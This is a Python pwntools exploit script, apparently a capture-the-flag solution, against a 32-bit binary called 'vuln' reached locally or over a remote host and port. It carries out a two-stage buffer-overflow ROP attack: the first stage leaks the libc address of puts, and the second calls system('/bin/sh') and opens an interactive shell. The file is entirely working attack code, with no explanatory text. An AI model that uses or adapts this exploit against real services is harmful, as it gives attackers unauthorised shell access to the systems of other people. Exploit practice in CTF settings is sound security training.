#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import time
import pwn


# Set up pwntools for the correct architecture
exe = pwn.context.binary = pwn.ELF('./vuln')

host = pwn.args.HOST or '127.0.0.1'
port = int(pwn.args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x080492C8
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

def Good(data):
    io.sendlineafter("> ", "1")
    io.send(data)
    io.recvline()

def Bad(data):
    io.sendlineafter("> ", "2")
    io.send(data)
    io.recvline()


libc = pwn.ELF('./libc.so.6')
offset = pwn.cyclic_find(0x61616164)

stage_1  = b"A" * offset
stage_1 += pwn.p32(exe.plt['puts'])
stage_1 += pwn.p32(exe.symbols['main'])
stage_1 += pwn.p32(exe.got['puts'])
stage_1

Good(stage_1)
Bad("A" * 32)

libc.address = pwn.u32(io.recv(4)) - libc.symbols['puts']
print("[+] Libc : 0x%x" % libc.address)
io.recvline()

stage_2  = b"A" * offset
stage_2 += pwn.p32(libc.symbols['system'])
stage_2 += pwn.p32(0xdeadbeef)
stage_2 += pwn.p32(next(libc.search(b"/bin/sh")))

Good(stage_2)
Bad("A" * 32)
io.interactive()
